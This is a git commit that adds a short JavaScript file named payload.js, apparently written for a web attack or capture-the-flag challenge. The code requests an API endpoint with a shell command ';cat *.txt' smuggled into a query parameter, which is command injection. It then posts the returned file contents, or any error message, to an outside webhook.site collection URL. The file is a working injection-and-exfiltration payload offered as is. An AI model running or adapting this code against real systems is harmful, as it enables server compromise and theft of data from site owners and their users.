520d07cd0db146669e254f1847a0745466009b2a
ANASS BOUCHFAR <43294537+anassbouchfar@users.noreply.github.com>
2024-09-22 03:58:04 +0100

    Create payload.js

---
+++ payload.js
@@ -0,0 +1,16 @@
+const fetchEndpoint = '/api/cal?modifier=;cat *.txt';  // The endpoint to fetch data from
+const reportEndpoint = 'https://webhook.site/1bcc4367-b9f6-47da-9d18-8637d16009bb';  // The server to send data or error to
+
+fetch(fetchEndpoint)
+  .then(res => res.text())  // Fetch the response as text
+  .then(data => fetch(reportEndpoint, {  // Send the fetched data to the report server
+    method: 'POST',
+    headers: { 'Content-Type': 'text/plain' },
+    body: data
+  }))
+  .catch(error => fetch(reportEndpoint, {  // If an error occurs, send the error message to the report server
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ error: error.message })
+  }));
+
